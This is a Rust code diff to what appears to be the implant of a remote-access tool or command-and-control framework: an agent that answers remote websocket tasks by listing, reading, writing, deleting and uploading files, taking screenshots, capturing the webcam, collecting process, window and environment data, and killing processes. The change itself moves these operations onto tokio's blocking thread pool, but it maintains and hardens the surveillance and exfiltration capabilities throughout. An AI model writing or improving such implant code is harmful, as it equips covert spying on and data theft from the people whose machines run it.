@@ -323,8 +323,10 @@ impl AgentEngine {
 
             // ── File operations ──────────────────────────────────
             ws_type::FILE_DRIVES => {
-                let executor = get_executor();
-                let drives = executor.get_drives();
+                let drives = blocking_val(|| {
+                    let executor = get_executor();
+                    executor.get_drives()
+                }).await;
                 let escaped: Vec<String> = drives.iter()
                     .map(|d| format!(r#""{}""#, d.replace('\\', "\\\\")))
                     .collect();
@@ -333,76 +335,78 @@ impl AgentEngine {
             }
             ws_type::FILE_LIST => {
                 let path = data_str(&data, "path", ".");
-                let r = libra_modules::execution::FileOps::list_directory(&path);
+                let r = blocking_string(move || libra_modules::execution::FileOps::list_directory(&path)).await;
                 ws_send(tx, &agent_id, "file.list.result", &r, rid).await;
             }
             ws_type::FILE_READ => {
                 let path = data_str(&data, "path", "");
-                let r = libra_modules::execution::FileOps::read_file(&path);
+                let r = blocking_string(move || libra_modules::execution::FileOps::read_file(&path)).await;
                 ws_send(tx, &agent_id, "file.read.result", &r, rid).await;
             }
             ws_type::FILE_WRITE => {
                 let path = data_str(&data, "path", "");
                 let content = data_str(&data, "data", "");
-                let r = libra_modules::execution::FileOps::write_file(&path, &content);
+                let r = blocking_string(move || libra_modules::execution::FileOps::write_file(&path, &content)).await;
                 ws_send(tx, &agent_id, "file.write.result", &r, rid).await;
             }
             ws_type::FILE_DELETE => {
                 let path = data_str(&data, "path", "");
-                let r = libra_modules::execution::FileOps::delete(&path);
+                let r = blocking_string(move || libra_modules::execution::FileOps::delete(&path)).await;
                 ws_send(tx, &agent_id, "file.delete.result", &r, rid).await;
             }
             ws_type::FILE_MKDIR => {
                 let path = data_str(&data, "path", "");
-                let r = libra_modules::execution::FileOps::create_directory(&path);
+                let r = blocking_string(move || libra_modules::execution::FileOps::create_directory(&path)).await;
                 ws_send(tx, &agent_id, "file.mkdir.result", &r, rid).await;
             }
             ws_type::FILE_RENAME => {
                 let path = data_str(&data, "path", "");
                 let new_name = data_str(&data, "newName", "");
-                let r = libra_modules::execution::FileOps::rename(&path, &new_name);
+                let r = blocking_string(move || libra_modules::execution::FileOps::rename(&path, &new_name)).await;
                 ws_send(tx, &agent_id, "file.rename.result", &r, rid).await;
             }
             ws_type::FILE_MOVE => {
                 let src = data_str(&data, "source", "");
                 let dst = data_str(&data, "destination", "");
-                let r = libra_modules::execution::FileOps::move_path(&src, &dst);
+                let r = blocking_string(move || libra_modules::execution::FileOps::move_path(&src, &dst)).await;
                 ws_send(tx, &agent_id, "file.move.result", &r, rid).await;
             }
             ws_type::FILE_COPY => {
                 let src = data_str(&data, "source", "");
                 let dst = data_str(&data, "destination", "");
-                let r = libra_modules::execution::FileOps::copy(&src, &dst);
+                let r = blocking_string(move || libra_modules::execution::FileOps::copy(&src, &dst)).await;
                 ws_send(tx, &agent_id, "file.copy.result", &r, rid).await;
             }
             ws_type::FILE_COMPRESS => {
                 let path = data_str(&data, "path", "");
-                let r = libra_modules::execution::FileOps::compress(&path);
+                let r = blocking_string(move || libra_modules::execution::FileOps::compress(&path)).await;
                 ws_send(tx, &agent_id, "file.compress.result", &r, rid).await;
             }
             ws_type::FILE_DECOMPRESS => {
                 let path = data_str(&data, "path", "");
-                let dest = data.as_ref().and_then(|d| d["destination"].as_str());
-                let r = libra_modules::execution::FileOps::decompress(&path, dest);
+                let dest: Option<String> = data.as_ref()
+                    .and_then(|d| d["destination"].as_str())
+                    .map(|s| s.to_string());
+                let r = blocking_string(move || libra_modules::execution::FileOps::decompress(&path, dest.as_deref())).await;
                 ws_send(tx, &agent_id, "file.decompress.result", &r, rid).await;
             }
             ws_type::FILE_SHORTCUT => {
                 let path = data_str(&data, "path", "");
-                let r = libra_modules::execution::FileOps::create_shortcut(&path);
+                let r = blocking_string(move || libra_modules::execution::FileOps::create_shortcut(&path)).await;
                 ws_send(tx, &agent_id, "file.shortcut.result", &r, rid).await;
             }
 
             // ── System info ──────────────────────────────────────
             ws_type::SYSTEM_PROCESSES => {
-                let r = libra_modules::recon::ProcessInfo::collect(None);
+                let r = blocking_string(move || libra_modules::recon::ProcessInfo::collect(None)).await;
                 ws_send(tx, &agent_id, "system.processes.result", &r, rid).await;
             }
             ws_type::SYSTEM_WINDOWS => {
-                let r = libra_modules::recon::WindowInfo::collect();
+                let r = blocking_string(move || libra_modules::recon::WindowInfo::collect()).await;
                 ws_send(tx, &agent_id, "system.windows.result", &r, rid).await;
             }
             ws_type::SYSTEM_ENV => {
-                let r = libra_modules::recon::EnvInfo::collect();
+                let r = blocking_string(move || libra_modules::recon::EnvInfo::collect()).await;
                 ws_send(tx, &agent_id, "system.env.result", &r, rid).await;
             }
             ws_type::SYSTEM_NETWORK => {
@@ -762,6 +766,27 @@ impl AgentEngine {
 
 // ── Helpers ──────────────────────────────────────────────────────────────
 
+/// Run a blocking (sync I/O / CPU-bound) closure on the blocking pool so it
+/// does not stall the async runtime worker threads.
+async fn blocking_string<F>(f: F) -> String
+where
+    F: FnOnce() -> String + Send + 'static,
+{
+    tokio::task::spawn_blocking(f)
+        .await
+        .unwrap_or_else(|_| r#"{"error":"blocking task panicked"}"#.to_string())
+}
+
+async fn blocking_val<F, T>(f: F) -> T
+where
+    F: FnOnce() -> T + Send + 'static,
+    T: Send + 'static,
+{
+    tokio::task::spawn_blocking(f)
+        .await
+        .unwrap_or_else(|_| panic!("blocking task panicked"))
+}
+
 fn data_str<'a>(data: &'a Option<Value>, key: &str, default: &'a str) -> String {
     data.as_ref()
         .and_then(|d| d[key].as_str())
@@ -870,11 +895,14 @@ async fn execute_task(
             ).await
         }
         CommandType::FileList => {
-            libra_modules::execution::FileOps::list_directory(&task.command)
+            let cmd = task.command.clone();
+            blocking_string(move || libra_modules::execution::FileOps::list_directory(&cmd)).await
         }
         CommandType::FileDrives => {
-            let executor = get_executor();
-            let drives = executor.get_drives();
+            let drives = blocking_val(|| {
+                let executor = get_executor();
+                executor.get_drives()
+            }).await;
             let escaped: Vec<String> = drives.iter()
                 .map(|d| format!(r#""{}""#, d.replace('\\', "\\\\")))
                 .collect();
@@ -884,25 +912,30 @@ async fn execute_task(
         CommandType::Upload | CommandType::Download => {
             // File transfer with arguments: FileOps read/write
             if let Some(arg) = task.arguments.first() {
-                if task.command_type == CommandType::Download {
-                    libra_modules::execution::FileOps::write_file(&task.command, arg)
-                } else {
-                    libra_modules::execution::FileOps::read_file(&task.command)
-                }
+                let cmd = task.command.clone();
+                let arg = arg.clone();
+                let is_download = task.command_type == CommandType::Download;
+                blocking_string(move || {
+                    if is_download {
+                        libra_modules::execution::FileOps::write_file(&cmd, &arg)
+                    } else {
+                        libra_modules::execution::FileOps::read_file(&cmd)
+                    }
+                }).await
             } else {
                 r#"{"error":"No file path specified"}"#.to_string()
             }
         }
         CommandType::Screenshot => {
-            libra_modules::execution::ScreenCapture::capture("medium", None)
+            blocking_string(move || libra_modules::execution::ScreenCapture::capture("medium", None)).await
         }
         CommandType::Webcam => {
-            libra_modules::execution::CameraCapture::capture(0)
+            blocking_string(move || libra_modules::execution::CameraCapture::capture(0)).await
         }
         CommandType::Kill => {
             // Kill specific process by PID
             if let Ok(pid) = task.command.parse::<u32>() {
-                let ok = libra_modules::recon::ProcessInfo::kill(pid);
+                let ok = blocking_val(move || libra_modules::recon::ProcessInfo::kill(pid)).await;
                 format!(r#"{{"success":{}}}"#, ok)
             } else {
                 r#"{"error":"Invalid PID"}"#.to_string()
